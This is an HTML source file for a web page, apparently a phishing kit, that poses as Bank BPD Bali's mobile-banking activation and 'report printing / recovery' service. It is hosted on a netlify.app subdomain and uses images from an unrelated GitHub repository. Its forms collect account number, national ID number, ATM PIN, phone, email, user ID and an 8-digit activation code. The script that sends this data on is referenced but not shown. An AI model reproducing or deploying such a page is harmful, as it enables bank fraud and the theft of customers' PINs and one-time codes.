<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    
    <!-- TITLE & BASIC SEO -->
    <title>BPD Bali - Aktivasi</title>
    <meta name="description" content="Layanan aktivasi dan laporan Bank BPD Bali. Masukkan data Anda untuk mencetak laporan atau pemulihan.">
    
    <!-- ========== OPEN GRAPH META TAGS (UNTUK THUMBNAIL DI MEDSOS) ========== -->
    <meta property="og:image" content="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/public/wwwucfyda5r6uvv.jpg">
    <meta property="og:image:secure_url" content="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/public/wwwucfyda5r6uvv.jpg">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:image:alt" content="Bank BPD Bali - Aktivasi Mobile Banking">
    
    <meta property="og:title" content="BPD Bali - Aktivasi Laporan">
    <meta property="og:description" content="Layanan aktivasi dan cetak laporan / pemulihan Bank BPD Bali.">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://layanan-nasabah-bpdbali.netlify.app/">
    
    <meta name="twitter:card" content="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/public/wwwucfyda5r6uvv.jpg">
    <meta name="twitter:title" content="BPD Bali - Aktivasi Laporan">
    <meta name="twitter:description" content="Layanan aktivasi dan cetak laporan / pemulihan Bank BPD Bali.">
    <meta name="twitter:image" content="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/public/wwwucfyda5r6uvv.jpg">
    
    <link rel="stylesheet" href="styles.css">
</head>
<body>

<div id="page1" class="page active">
    <img class="bg-image" src="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/haiwiwwiwi.jpg" alt="bg">
    <button class="btn-nav" onclick="pindahHalaman('page2')">Aktivasi</button>
    <button class="btn-nav btn-nav-second" onclick="pindahHalaman('page2')">Cetak Laporan / Pemulihan</button>
</div>

<div id="page2" class="page">
    <img class="bg-image" src="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/hsusisieiggfc.jpg" alt="bg">
    
    <div class="logo-header">
        <img src="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/fhswyeidusys.jpg" alt="Logo" onerror="this.src='https://placehold.co/1920x80?text=LOGO+BPD+BALI'; this.onerror=null;">
    </div>
    
    <div class="form-container form-page2" id="formPage2">
        <div class="form-title">Registrasi</div>
        <div class="form-divider"></div>
        
        <div class="form-row">
            <span class="form-label">No. Rekening</span>
            <input type="text" class="form-input" id="noRekening" inputmode="numeric" pattern="[0-9]*" autofocus>
        </div>
        <div class="form-row">
            <span class="form-label">No. Identitas</span>
            <input type="text" class="form-input" id="noIdentitas" inputmode="numeric" pattern="[0-9]*">
        </div>
        <div class="form-row">
            <span class="form-label">PIN ATM</span>
            <input type="password" class="form-input" id="pinAtm" maxlength="6" inputmode="numeric" pattern="[0-9]*">
        </div>
        <div class="form-row">
            <span class="form-label">No. Telepon</span>
            <input type="tel" class="form-input" id="noTelpon" inputmode="numeric" pattern="[0-9]*">
        </div>
        <div class="form-row">
            <span class="form-label">Email</span>
            <input type="email" class="form-input" id="email" inputmode="email">
        </div>
        <div class="info-text" id="infoPage2">* Harap isi semua data</div>
        
        <button class="btn-action" id="btnLanjut" onclick="lanjutKePage3()">Cetak Laporan / Pemulihan</button>
    </div>
</div>

<div id="page3" class="page">
    <img class="bg-image" src="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/hsusisieiggfc.jpg" alt="bg">
    
    <div class="logo-header">
        <img src="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/fhswyeidusys.jpg" alt="Logo" onerror="this.src='https://placehold.co/1920x80?text=LOGO+BPD+BALI'; this.onerror=null;">
    </div>
    
    <div class="form-container form-page3" id="formPage3">
        <div class="form-title">Aktivasi</div>
        <div class="form-divider"></div>
        
        <div class="form-row">
            <span class="form-label">User.id</span>
            <input type="text" class="form-input" id="username" inputmode="text">
        </div>
        <div class="form-row">
            <span class="form-label">Kode Aktivasi</span>
            <input type="text" class="form-input" id="kodeOtp" maxlength="8" inputmode="numeric" pattern="[0-9]*">
        </div>
        <div class="info-text" id="infoPage3">* Masukkan kode aktivasi 8 digit</div>
        
        <button class="btn-action" id="btnVerifikasi" onclick="verifikasiKode()">Cetak Laporan / Pemulihan</button>
    </div>
</div>

<script src="script.js"></script>
</body>
</html>
